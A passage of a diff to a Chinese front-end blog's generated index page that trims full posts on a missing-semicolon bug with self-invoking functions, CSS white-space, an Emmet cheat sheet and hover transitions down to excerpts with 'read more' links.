class="literal">null</span>);</div><div class="line">			&#125;)();</div><div class="line">						</div><div class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>已知，所获取的 <code>data.json</code>数据无误，且亦无拼写错误和功能性错误。</p>
-<hr>
-<p>乍一分析，其实也找不出到底是什么原因导致页面无法输出，通过查看控制台出现如下报错：</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-89c43b602e243e8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="error1"></p>
-<p>经过进一步查看可以看到，<code>SelectCard.handleJson</code> 函数中所传入的参数，并不是我们所期望的 <code>xhr.responseText</code> 数据，而是一个<strong>匿名函数</strong>。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-3546fc55415e3a81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="error2"></p>
-<p>通过调试获取所传入的参数<code>resultText</code>并向控制台输出</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-b6ed4e4ea756c499.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test1"></p>
-<p>查看控制台输出结果我们可以发现所传入的参数居然是它下面的 <strong>自执行的匿名函数</strong> 本身，而非我们所期望的 <code>xhr.responseText</code> </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-ec97821b76ed6c2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test2"></p>
-<hr>
-<blockquote>
-<p>#####那么问题来了，为何我们所设定的  “自执行的匿名函数” 会被当做参数传到了上面的函数中呢？</p>
-</blockquote>
-<p>在平常编程的过程中，我们常常会在一句话的末尾加上分号来表示这句话的结束，然而对于函数，我想大部分人应该习惯性的不会加分号来进行分隔，因为函数与函数之间，函数与变量之间即使没有分号，也不会对彼此产生任何影响。</p>
-<p>然而，有一个东西写在函数后却会对前面的函数产生影响，而且一般很难察觉，它就是 <strong>自执行的匿名函数</strong>。</p>
-<p>#####由于这一匿名函数被设定为自执行，这就使得这个匿名函数无形中被 括号 包裹起来，即使与它上面的函数有换行的分隔也会被当做参数传入它上面的函数中，这一隐性影响使得 我们始终无法获得 自执行的匿名函数中的目标参数，因为它上面的函数已经把整个自执行的匿名函数当做了要传入的参数。</p>
-<hr>
-<blockquote>
-<p>#####那么，肯定有人会说，把这个自执行的匿名函数放到他上面的函数的前面不就好了？</p>
-</blockquote>
-<p>这确实是一个方法，不过你仔细看看上面提供的问题代码会发现，这个自执行的匿名函数的前一个函数的前面又是一个函数，那么这个自执行的匿名函数便又被当做了参数传入上面的函数中，<strong>只有当调整位置后的 自执行匿名函数 的前面再找不到函数的时候，这个方法才是有效的。</strong></p>
-<blockquote>
-<p>####不过最好的方法是:</p>
-</blockquote>
-<p>#####保证 -自执行的匿名函数- 的前面一句话的末尾始终有 -分号- 即可。<br>这样的话，即使这一 <strong>自执行的匿名函数</strong> 前面是函数，也不会有任何影响了。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-5d9faeb65358683a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="代码修改处"></p>
-<hr>
-<blockquote>
-<p>以上纯属个人学习总结，如有疏漏或者不足之处还望指正，谢谢！</p>
-</blockquote>
-
+              <p>今天在用面向对象进行编程的过程中，遇到了一个隐藏得很深的坑，在此与大家分享一下，避免以后再犯，也给大家提供一个参考。<br>+
+          
       
     </div>
     
@@ -523,6 +438,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2015/06/07/js-匿名函数自执行-之-隐性影响/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -569,53 +488,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>在我们开发网站的过程中常常会遇到文本被强制换行的情况发生，比如：</p>
+              <p>在我们开发网站的过程中常常会遇到文本被强制换行的情况发生，比如：</p>
 <p><img src="http://upload-images.jianshu.io/upload_images/2836722-5b5f8f0b6f814441.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="强制换行案例"><br>图中一个完整的 <code>a</code> 标签被活生生截断（强制换行），这往往不是我们所想要的，但是这也是我们无法避免的，因为在网站开发过程中，我们往往无法做到精确计算出能够完美展示所容纳文本格式的空间大小。</p>
-<p>遇到这种情况一般的处理思路要么想办法算距离，要么一点一点的调节以达到预期要求，但是，这样做既费时又费力，那么有什么办法能一劳永逸呢？</p>
-<p>其实 CSS 为我们提供了 <code>white-space</code> 属性<br>通过设置<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">a</span>&#123;<span class="attribute">white-space</span>:nowrap;&#125;</div></pre></td></tr></table></figure></p>
-<p>可以规定一个完整的 <code>a</code> 标签中的文本不进行换行，修改后的效果如图：</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-2385a724016dcb88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改后的效果图"><br>当然不仅仅是 <code>a</code> 标签，在开发过程中我们可以对任意的一个文本整体设定这一属性，这样一来便不会出现一个整体被截断的情况了。</p>
-<hr>
-<p><strong>下面对 <code>white-space</code> 属性做一个小结：</strong></p>
-<p><strong>white-space</strong> 属性指定元素内的空白怎样处理。</p>
-<blockquote>
-<p><strong>属性值</strong></p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>值</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>normal</td>
-<td>默认。空白会被浏览器忽略。</td>
-</tr>
-<tr>
-<td>pre</td>
-<td>空白会被浏览器保留。其行为方式类似 HTML 中的  <code>&lt;pre&gt;</code> 标签。</td>
-</tr>
-<tr>
-<td>nowrap</td>
-<td>文本不会换行，文本会在在同一行上继续，直到遇到  <code>&lt;br&gt;</code> 标签为止。</td>
-</tr>
-<tr>
-<td>pre-wrap</td>
-<td>保留空白符序列，但是正常地进行换行。</td>
-</tr>
-<tr>
-<td>pre-line</td>
-<td>合并空白符序列，但是保留换行符。</td>
-</tr>
-<tr>
-<td>inherit</td>
-<td>规定应该从父元素继承 <strong>white-space</strong> 属性的值。</td>
-</tr>
-</tbody>
-</table>
-
+<p>遇到这种情况一般的处理思路要么想办法算距离，要么一点一点的调节以达到预期要求，但是，这样做既费时又费力，那么有什么办法能一劳永逸呢？<br>+
+          
       
     </div>
     
@@ -624,6 +500,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2015/05/18/HTML-5-基础之-文本-强制不换行/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -670,124 +550,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>Emmet是一款文本编辑器/IDE的插件，用来快速生成复杂的HTML代码，只要掌握一些常用的语法（类似于CSS选择器），就可以减少重复编码的工作。</strong></p>
-<hr>
-<p>####1.调用方法</p>
-<blockquote>
-<p>#####Emmet使用Tab作为自动生成HTML代码的触发器。</p>
-<p>######输入完生成HTML的缩写语句后，按下Tab，即可生成对应的HTML代码</p>
-</blockquote>
-<p>####2.相关语法</p>
-<blockquote>
-<p>#####后代：&gt;</p>
-<hr>
-<p>#####Child: &gt;</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>div&gt;ul&gt;li</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;div&gt;</span></div><div class="line">	<span class="section">&lt;ul&gt;</span></div><div class="line">		<span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">	<span class="section">&lt;/ul&gt;</span></div><div class="line"><span class="section">&lt;/div&gt;</span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####兄弟：+</p>
-<hr>
-<p>#####Sibling: +</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>div+p+bq</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;div&gt;</span><span class="section">&lt;/div&gt;</span></div><div class="line"><span class="section">&lt;p&gt;</span><span class="section">&lt;/p&gt;</span></div><div class="line"><span class="section">&lt;blockquote&gt;</span><span class="section">&lt;/blockquote&gt;</span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####上级元素：^</p>
-<hr>
-<p>#####Climb-up: ^</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>div+div&gt;p&gt;span+em^bq</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;div&gt;</span><span class="section">&lt;/div&gt;</span></div><div class="line"><span class="section">&lt;div&gt;</span></div><div class="line">	<span class="section">&lt;p&gt;</span><span class="section">&lt;span&gt;</span><span class="section">&lt;/span&gt;</span><span class="section">&lt;em&gt;</span><span class="section">&lt;/em&gt;</span><span class="section">&lt;/p&gt;</span></div><div class="line">	<span class="section">&lt;blockquote&gt;</span><span class="section">&lt;/blockquote&gt;</span></div><div class="line"><span class="section">&lt;/div&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>div+div&gt;p&gt;span+em^^bq</code><br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;div&gt;</span><span class="section">&lt;/div&gt;</span></div><div class="line"><span class="section">&lt;div&gt;</span></div><div class="line">    <span class="section">&lt;p&gt;</span><span class="section">&lt;span&gt;</span><span class="section">&lt;/span&gt;</span><span class="section">&lt;em&gt;</span><span class="section">&lt;/em&gt;</span><span class="section">&lt;/p&gt;</span></div><div class="line"><span class="section">&lt;/div&gt;</span></div><div class="line"><span class="section">&lt;blockquote&gt;</span><span class="section">&lt;/blockquote&gt;</span></div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>#####分组：（）</p>
-<hr>
-<p>#####Grouping: ( )</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>(div&gt;dl&gt;(dt+dd)*3)+footer&gt;p</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;div&gt;</span></div><div class="line">    <span class="section">&lt;dl&gt;</span></div><div class="line">        <span class="section">&lt;dt&gt;</span><span class="section">&lt;/dt&gt;</span></div><div class="line">        <span class="section">&lt;dd&gt;</span><span class="section">&lt;/dd&gt;</span></div><div class="line">        <span class="section">&lt;dt&gt;</span><span class="section">&lt;/dt&gt;</span></div><div class="line">        <span class="section">&lt;dd&gt;</span><span class="section">&lt;/dd&gt;</span></div><div class="line">        <span class="section">&lt;dt&gt;</span><span class="section">&lt;/dt&gt;</span></div><div class="line">        <span class="section">&lt;dd&gt;</span><span class="section">&lt;/dd&gt;</span></div><div class="line">    <span class="section">&lt;/dl&gt;</span></div><div class="line"><span class="section">&lt;/div&gt;</span></div><div class="line"><span class="section">&lt;footer&gt;</span></div><div class="line">    <span class="section">&lt;p&gt;</span><span class="section">&lt;/p&gt;</span></div><div class="line"><span class="section">&lt;/footer&gt;</span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####重复多份：*</p>
-<hr>
-<p>#####Multiplication: *</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>ul&gt;li*5</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;ul&gt;</span></div><div class="line">    <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">    <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">    <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">    <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">    <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line"><span class="section">&lt;/ul&gt;</span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####编号：$</p>
-<hr>
-<p>#####Item numbering: $</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>ul&gt;li.item$*5</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;ul&gt;</div><div class="line">    <span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item1"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item2"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item3"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item4"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item5"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">&lt;<span class="regexp">/ul&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>h$[title=item$]{Header $}*3</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">title</span>=<span class="string">"item1"</span>&gt;</span>Header 1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">title</span>=<span class="string">"item2"</span>&gt;</span>Header 2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">title</span>=<span class="string">"item3"</span>&gt;</span>Header 3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>ul&gt;li.item$$$*5</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;ul&gt;</div><div class="line">    <span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item001"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item002"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item003"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item004"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item005"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">&lt;<span class="regexp">/ul&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>ul&gt;li.item$@-*5</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;ul&gt;</div><div class="line">    <span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item5"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item4"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item3"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item2"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item1"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">&lt;<span class="regexp">/ul&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>ul&gt;li.item$@3*5</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;ul&gt;</div><div class="line">    <span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item3"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item4"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item5"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item6"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">    &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item7"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></div><div class="line">&lt;<span class="regexp">/ul&gt;</span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####ID和类属性</p>
-<hr>
-<p>#####ID and CLASS attributes</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>#header</code></p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"header"</span>&gt;&lt;/<span class="keyword">div</span>&gt;</div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>.title</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"title"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>form#search.wide</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">""</span> id=<span class="string">"search"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"wide"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>p.class1.class2.class3</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"class1 class2 class3"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####自定义属性</p>
-<hr>
-<p>#####Custom attributes</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>p[title=&quot;Hello world&quot;]</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">"Hello world"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>td[rowspan=2 colspan=3 title]</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span> <span class="attr">colspan</span>=<span class="string">"3"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>[a=&#39;value1&#39; b=&quot;value2&quot;]</code></p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="keyword">div</span> <span class="keyword">a</span>=<span class="string">"value1"</span> b=<span class="string">"value2"</span>&gt;&lt;/<span class="keyword">div</span>&gt;</div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####文本：{ }</p>
-<hr>
-<p>#####Text: { }</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>a{Click me}</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>p&gt;{Click }+a{here}+{ to continue}</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Click <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span> to continue<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>#####隐式标签</p>
-<hr>
-<p>#####Implicit tag names</p>
-</blockquote>
-<p><strong>缩写</strong>：<code>.class</code></p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>&gt;&lt;/<span class="keyword">div</span>&gt;</div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>em&gt;.class</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;em&gt;<span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"class"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">em</span>&gt;</span></span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>ul&gt;.class</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;ul&gt; <span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"class"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></div></pre></td></tr></table></figure>
-<p><strong>缩写</strong>：<code>table&gt;.row&gt;.col</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"col"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>#####3.HTML</p>
-<blockquote>
-<p><em>所有未知的缩写都会转换成标签，例如，foo → <foo></foo></em><br><strong>缩写</strong>：<code>!</code></p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    </div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<hr>
-<blockquote>
-<p>本文所列仅为最常用的一些语法和缩写，有关其他较为少用的可参考<a href="http://docs.emmet.io/cheat-sheet/" target="_blank" rel="external">Emmet官方文档</a></p>
-</blockquote>
-<p><strong>特别声明：</strong>文中演示代码来自于官网API：<a href="http://docs.emmet.io/cheat-sheet/" target="_blank" rel="external">http://docs.emmet.io/cheat-sheet/</a></p>
-
+              <p><strong>Emmet是一款文本编辑器/IDE的插件，用来快速生成复杂的HTML代码，只要掌握一些常用的语法（类似于CSS选择器），就可以减少重复编码的工作。</strong><br>+
+          
       
     </div>
     
@@ -796,6 +560,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2015/04/26/Emmet-语法-速查表/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -842,33 +610,12 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>#####对于之前实现鼠标 hover 元素从隐藏到出现的方法常用的有两种：</p>
+              <p>#####对于之前实现鼠标 hover 元素从隐藏到出现的方法常用的有两种：</p>
 <blockquote>
 <p>1.通过display：none；或者 visibility：hidden；来实现元素的隐藏，而通过设置被 hover 元素 display：block；或者 visibility：visible；来实现元素的重新显示。<br>2.通过设置宽或者高为 0 来实现元素隐藏，而通过重新设置被 hover 元素的宽高来实现元素的显示。</p>
 </blockquote>
-<p>第一种方式无法实现动态的显示效果，而第二种方式可以实现较美观的动态效果，只需设置 transition：all  .3s；即可。</p>
-<p>######但是，通过实践发现：若要实现从中心平滑放大的效果，第二种方式怎么也做不到那种平滑的效果。</p>
-<blockquote>
